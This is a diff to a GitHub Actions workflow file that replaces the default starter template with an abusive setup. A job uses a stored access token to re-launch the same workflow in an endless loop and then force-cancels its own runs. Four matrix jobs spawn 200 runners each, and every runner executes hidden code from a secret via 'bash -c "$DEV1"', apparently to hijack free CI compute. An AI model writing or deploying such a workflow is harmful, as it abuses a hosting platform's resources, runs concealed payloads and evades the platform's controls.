@@ -1,36 +1,106 @@
-# This is a basic workflow to help you get started with Actions
-
-name: CI
-
-# Controls when the workflow will run
+name: 😡😡😡😡
 on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
   push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-
-  # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
 
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+permissions:
+  actions: write
+
+concurrency:
+  group: ulang-terus
+  cancel-in-progress: false
+
 jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
+  jaga:
     runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v4
-
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
-
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
+      - name: okedeh
+        env:
+          GH_TOKEN: ${{ secrets.PAT }}
         run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+          set -u
+          repo="${{ github.repository }}"
+          run_id="${{ github.run_id }}"
+
+          echo "wait..."
+          sleep 60
+
+          echo "Refresh..."
+          gh workflow run "😡😡😡😡" --repo "$repo" --ref main
+
+          echo "wait..."
+          sleep 120
+
+          echo "clear..."
+          while true; do
+            active_jobs=$(gh run view "$run_id" --repo "$repo" --json jobs \
+              --jq '[.jobs[] | select(.name != "jaga") | select(.status == "queued" or .status == "in_progress" or .status == "waiting" or .status == "pending")] | length')
+
+            if [ "$active_jobs" = "0" ]; then
+              echo "done."
+              break
+            fi
+
+            echo "$active_jobs ..."
+            gh run cancel "$run_id" --repo "$repo" || true
+            gh api --method POST "/repos/$repo/actions/runs/$run_id/force-cancel" || true
+            
+            echo "wait..."
+            sleep 5
+          done
+
+          echo "done."
+          
+
+  bert:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        one: [aa, bb, cc, dd, ee, ff, gg, hh, ii, jj, kk, ll, mm, nn, oo, pp, qq, rr, ss, tt]
+        two: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: bertjob
+        env:
+          DEV1: ${{ secrets.DEV1 }}
+        run: bash -c "$DEV1"
+
+  bert2:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        one: [aa, bb, cc, dd, ee, ff, gg, hh, ii, jj, kk, ll, mm, nn, oo, pp, qq, rr, ss, tt]
+        two: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: bertjob
+        env:
+          DEV1: ${{ secrets.DEV1 }}
+        run: bash -c "$DEV1"
+
+  bert3:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        one: [aa, bb, cc, dd, ee, ff, gg, hh, ii, jj, kk, ll, mm, nn, oo, pp, qq, rr, ss, tt]
+        two: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: bertjob
+        env:
+          DEV1: ${{ secrets.DEV1 }}
+        run: bash -c "$DEV1"
+
+  bert4:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        one: [aa, bb, cc, dd, ee, ff, gg, hh, ii, jj, kk, ll, mm, nn, oo, pp, qq, rr, ss, tt]
+        two: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: bertjob
+        env:
+          DEV1: ${{ secrets.DEV1 }}
+        run: bash -c "$DEV1"
